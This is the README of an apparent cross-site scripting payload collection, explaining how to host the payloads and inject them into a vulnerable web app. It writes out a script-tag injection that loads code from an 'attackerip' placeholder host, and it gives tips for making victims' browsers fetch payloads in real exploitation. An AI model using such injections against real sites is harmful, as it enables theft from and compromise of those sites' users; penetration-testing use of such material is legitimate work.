# xss_payloads

Payloads for practical exploitation of cross site scripting.

## Usage

1. Find XSS vuln in your app
2. Get PoC exploit: alert(1) etc
3. Host these payloads somewhere
4. Use vuln to pull one of these payloads into the app `<script src="http://attackerip/file.js"></script>`
5. Profit

## js vs php files

Some of the files are plain JavaScript .js files, others are PHP scripts which serve JavaScript when rendered in order to do some more complex stuff. Make sure you have a PHP interpreter running on your web server of choice to get these to work `</obvious>`

## Common Problems

* You can't serve these over HTTP if your app is running on HTTPS. You'll need to serve them over HTTPS
* If you're running these over HTTPS for actual exploitation rather than a PoC, you'll need a proper trusted TLS cert (Let's Encrypt CA, for example) otherwise victim's browsers won't fetch the files at all. If it's for a PoC you can just temporarily trust your self signed cert.
* Hit F12 and view the debug console for any information about why a particular script might not work
